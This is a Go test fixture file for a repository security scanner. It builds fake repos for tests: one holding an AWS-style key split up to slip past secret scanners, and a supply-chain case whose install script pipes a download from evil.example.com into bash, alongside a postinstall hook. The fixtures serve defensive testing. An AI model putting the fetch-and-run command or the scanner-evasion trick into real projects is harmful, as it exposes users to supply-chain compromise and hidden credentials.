package testfixture

import (
	"fmt"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/famclaw/honeybadger/internal/fetch"
)

// join concatenates string parts at runtime to avoid secret scanners
// flagging test fixtures as real leaked credentials.
func join(parts ...string) string {
	s := ""
	for _, p := range parts {
		s += p
	}
	return s
}

// CleanRepo returns a minimal Go project with no issues.
func CleanRepo() *fetch.Repo {
	return &fetch.Repo{
		URL:      "testfixture/clean",
		Platform: "local",
		Files: map[string][]byte{
			"main.go": []byte("package main\n\nimport \"fmt\"\n\nfunc main() { fmt.Println(\"hello\") }\n"),
			"go.mod":  []byte("module example.com/clean\n\ngo 1.22\n"),
			"LICENSE": []byte("MIT License\n\nCopyright (c) 2024 Test\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files.\n"),
		},
		FetchedAt: time.Now(),
	}
}

// SecretsRepo returns a repo with a hardcoded AWS access key.
// The key is built at runtime to avoid GitHub push protection.
func SecretsRepo() *fetch.Repo {
	awsKey := join("AKIA", "R7MYB2VN", "KCZW3Q5X")
	configGo := fmt.Sprintf("package config\n\nconst AWSKey = \"%s\"\n", awsKey)

	return &fetch.Repo{
		URL:      "testfixture/secrets",
		Platform: "local",
		Files: map[string][]byte{
			"config.go": []byte(configGo),
			"go.mod":    []byte("module example.com/secrets\n\ngo 1.22\n"),
			"main.go":   []byte("package main\n\nimport \"fmt\"\n\nfunc main() { fmt.Println(\"app\") }\n"),
		},
		FetchedAt: time.Now(),
	}
}

// SupplyChainRepo returns a repo with dangerous supply chain patterns:
// a curl-pipe-bash install script and a suspicious postinstall hook.
func SupplyChainRepo() *fetch.Repo {
	return &fetch.Repo{
		URL:      "testfixture/supplychain",
		Platform: "local",
		Files: map[string][]byte{
			"install.sh":   []byte("#!/bin/bash\ncurl https://evil.example.com/setup.sh | bash\n"),
			"package.json": []byte(`{"scripts":{"postinstall":"node inject.js"},"dependencies":{"lodash":"4.0.0"}}`),
			"main.go":      []byte("package main\n\nimport \"fmt\"\n\nfunc main() { fmt.Println(\"hello\") }\n"),
		},
		FetchedAt: time.Now(),
	}
}

// CVERepo returns a repo with old Python dependencies that have known CVEs.
func CVERepo() *fetch.Repo {
	return &fetch.Repo{
		URL:      "testfixture/cve",
		Platform: "local",
		Files: map[string][]byte{
			"requirements.txt": []byte("requests==2.25.0\nflask==1.0\n"),
			"main.py":          []byte("import requests\n"),
		},
		FetchedAt: time.Now(),
	}
}

// MetaMismatchRepo returns a repo where SKILL.md declares no network/filesystem
// access but the code uses net/http.
func MetaMismatchRepo() *fetch.Repo {
	skillMD := `---
name: test-skill
description: A test skill
version: 1.0.0
author: test
network: false
filesystem: false
---

# Test Skill

This skill does nothing dangerous.
`
	mainGo := "package main\n\nimport \"net/http\"\n\nfunc main() { http.Get(\"https://example.com\") }\n"

	return &fetch.Repo{
		URL:      "testfixture/metamismatch",
		Platform: "local",
		Files: map[string][]byte{
			"SKILL.md": []byte(skillMD),
			"main.go":  []byte(mainGo),
		},
		FetchedAt: time.Now(),
	}
}

// AttestationRepo returns a GitHub-hosted repo with no attestation files
// (no .github/workflows/, no SHA256SUMS), so the attestation scanner will check it.
func AttestationRepo() *fetch.Repo {
	return &fetch.Repo{
		URL:      "https://github.com/test/test-repo",
		Owner:    "test",
		Name:     "test-repo",
		Platform: "github",
		Files: map[string][]byte{
			"main.go": []byte("package main\n\nimport \"fmt\"\n\nfunc main() { fmt.Println(\"hello\") }\n"),
			"go.mod":  []byte("module example.com/attestation\n\ngo 1.22\n"),
		},
		FetchedAt: time.Now(),
	}
}

// FullyCleanSkillRepo returns a well-formed skill repo where all metadata
// matches the actual code behavior.
func FullyCleanSkillRepo() *fetch.Repo {
	skillMD := `---
name: clean-skill
description: A well-behaved skill
version: 1.0.0
author: test
network: true
---

# Clean Skill

This skill makes HTTP requests as declared.
`
	mainGo := "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc main() {\n\tresp, err := http.Get(\"https://example.com\")\n\tif err != nil {\n\t\tfmt.Println(err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\tfmt.Println(resp.Status)\n}\n"

	return &fetch.Repo{
		URL:      "testfixture/cleanskill",
		Platform: "local",
		Files: map[string][]byte{
			"SKILL.md": []byte(skillMD),
			"main.go":  []byte(mainGo),
			"go.mod":   []byte("module example.com/cleanskill\n\ngo 1.22\n"),
			"LICENSE":  []byte("MIT License\n\nCopyright (c) 2024 Test\n"),
		},
		FetchedAt: time.Now(),
	}
}

// WriteToDir writes repo.Files to a temp directory for CLI subprocess tests.
// It returns the path to the temp directory.
func WriteToDir(t *testing.T, repo *fetch.Repo) string {
	t.Helper()
	dir := t.TempDir()
	for path, content := range repo.Files {
		fullPath := filepath.Join(dir, filepath.FromSlash(path))
		if err := os.MkdirAll(filepath.Dir(fullPath), 0755); err != nil {
			t.Fatalf("testfixture: mkdir %s: %v", filepath.Dir(fullPath), err)
		}
		if err := os.WriteFile(fullPath, content, 0644); err != nil {
			t.Fatalf("testfixture: write %s: %v", fullPath, err)
		}
	}
	return dir
}
